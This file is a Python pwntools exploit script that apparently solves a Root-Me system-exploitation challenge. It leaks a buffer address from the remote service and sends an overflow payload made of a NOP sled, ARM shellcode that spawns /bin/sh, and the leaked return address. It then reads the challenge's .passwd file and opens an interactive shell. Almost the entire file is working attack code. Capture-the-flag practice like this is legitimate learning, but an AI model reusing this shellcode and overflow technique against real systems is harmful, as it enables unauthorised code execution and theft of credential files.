from pwn import *
import struct
import socket
import time

def p32(x): return struct.pack('<L', x)

p = remote("challenge04.root-me.org", 61045)

print p.recv(1024)  # Give me data to dump:

dummy = "AAAA"               # dummy
p.send(dummy+"\n")

recv_msg = p.recv(2048)
print recv_msg  # buf_addr: blah blah...Dump again (y/n):
buf_addr = recv_msg.split(':')[0]

p.send("y\n")
print p.recv(2048)  # Give me data to dump:

payload = "\x90"*136
# /bin/sh
payload += "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78" 
buf_addr = struct.pack('I', int(buf_addr, 16))
payload += (buf_addr)

cmd = "/bin/cat /challenge/app-systeme/ch45/.passwd\n"

p.send(payload+"\n")
print p.recv(2048)
p.send("n\n")

p.send(cmd)

p.interactive()
